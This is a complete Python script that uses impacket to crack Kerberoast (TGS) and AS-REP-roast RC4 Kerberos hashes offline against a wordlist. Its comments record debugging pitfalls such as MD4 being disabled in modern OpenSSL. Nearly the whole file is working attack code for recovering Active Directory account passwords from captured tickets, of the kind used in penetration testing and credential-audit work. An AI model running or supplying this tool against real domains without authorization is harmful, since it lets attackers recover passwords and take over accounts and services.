#!/usr/bin/env python3
# Offline crack of $krb5tgs$23$ (RC4-HMAC) kerberoast hashes with a wordlist, using impacket.
# Works when hashcat/john are absent, or when they lack the krb5tgs format (base Fedora `john`
# does NOT ship it - only the jumbo build does). Also cracks $krb5asrep$23$ with --asrep.
#
# TWO GOTCHAS this encodes (both bit us and produced a false "everything uncracked"):
#   1) hashlib.new('md4', ...) is DISABLED on modern OpenSSL / Python 3.11+ ->
#      use impacket.ntlm.compute_nthash for the RC4 long-term key.
#   2) Do NOT wrap the key derivation in the same try/except that catches the decrypt failure,
#      or a raised md4/derivation error is silently swallowed and EVERY password reports
#      "uncracked". Derive OUTSIDE the try; only the decrypt goes inside it.
# Key usage: service-ticket EncTicketPart = 2 (TGS); AS-REP enc-part = 3.
#
# Usage:
#   python3 crack-krb5tgs-rc4.py kerberoast.hashes wordlist.txt            # TGS (13100)
#   python3 crack-krb5tgs-rc4.py asreproast.hashes wordlist.txt --asrep    # AS-REP (18200)
import sys
from impacket.krb5.crypto import Key, _enctype_table
from impacket.ntlm import compute_nthash

hashes_file, wordlist = sys.argv[1], sys.argv[2]
asrep = "--asrep" in sys.argv[3:]
prefix = "$krb5asrep$23$" if asrep else "$krb5tgs$23$"
KEYUSAGE = 3 if asrep else 2
words = [w.rstrip("\n") for w in open(wordlist, encoding="latin-1")]
cipher = _enctype_table[23]

def parse(line):
    # TGS:    $krb5tgs$23$*label$REALM$spn*$<chk>$<edata>
    # AS-REP: $krb5asrep$23$user@REALM:<chk>$<edata>
    if asrep:
        body = line[len("$krb5asrep$23$"):]
        label, rest = body.split(":", 1)
        chk, edata = rest.split("$", 1)
    else:
        hdr, tail = line.split("*$", 1)
        label = hdr.split("*", 1)[1].split("$", 1)[0]
        chk, edata = tail.split("$", 1)
    return label, bytes.fromhex(chk + edata)

for line in open(hashes_file):
    line = line.strip()
    if not line.startswith(prefix):
        continue
    label, blob = parse(line)
    found = None
    for pw in words:
        key = Key(23, compute_nthash(pw))   # derivation OUTSIDE try (errors must surface)
        try:
            cipher.decrypt(key, KEYUSAGE, blob)
            found = pw
            break
        except Exception:
            pass
    print("%-24s %s" % (label, found if found else "(uncracked)"))
